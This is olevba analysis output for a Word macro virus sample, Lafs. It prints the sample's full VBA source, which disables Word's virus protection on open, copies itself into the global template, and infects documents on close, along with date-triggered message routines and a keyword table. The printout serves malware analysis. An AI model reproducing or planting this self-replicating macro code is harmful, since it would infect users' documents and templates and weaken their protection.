olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lafs-dda6d0d8889e2c05f3f1b2ee2ab4127d6d729c3a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lafs-dda6d0d8889e2c05f3f1b2ee2ab4127d6d729c3a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO lafs.bas 
in file: Virus.MSWord.Lafs-dda6d0d8889e2c05f3f1b2ee2ab4127d6d729c3a - OLE stream: 'Macros/VBA/lafs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Autoopen()
On Error GoTo abort
Options.VirusProtection = False
exec

sFn$ = WordBasic.[FileName$]()
sMn$ = sFn$ + ":dd"
WordBasic.MacroCopy sMn$, "Global:lafs"

abort:
End Sub
Sub Autoclose()
On Error GoTo quit
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sFn$ = WordBasic.[FileName$]()
sMn$ = sFn$ + ":dd"
WordBasic.MacroCopy "Global:lafs", sMn$

WordBasic.FileSaveAs dlg
GoTo Done
quit:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub

Sub ToolsMacro()
End Sub


Sub ViewVbCode()

End Sub

Sub FileTemplates()

End Sub
Sub exec()

tgl$ = Day(Now())
bln$ = Month(Now())
If tgl$ = 14 And bln$ = 6 Then
With Assistant.NewBalloon
    .Heading = "Happy Birthday"
    .Text = "Selamat Ulang Tahun sayang semoga panjang umur dan tuhan menyertaimu."
    .Icon = msoIconTip
    .Show
End With
End If
If tgl$ = 6 And bln$ = 11 Then
T$ = Chr(13) + " Love at First Sight" + Chr(13)
T$ = T$ + Chr(13) + " Patas AC 19 "
T$ = T$ + Chr(13) + "6 November 1997 "

WordBasic.FormatFont Font:="Arial", Points:=10
WordBasic.Insert T$
End If

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoopen            |Runs when the Word document is opened        |
|AutoExec  |Autoclose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|exec                |May run an executable file or a system       |
|          |                    |command using Excel 4 Macros (XLM/XLF)       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

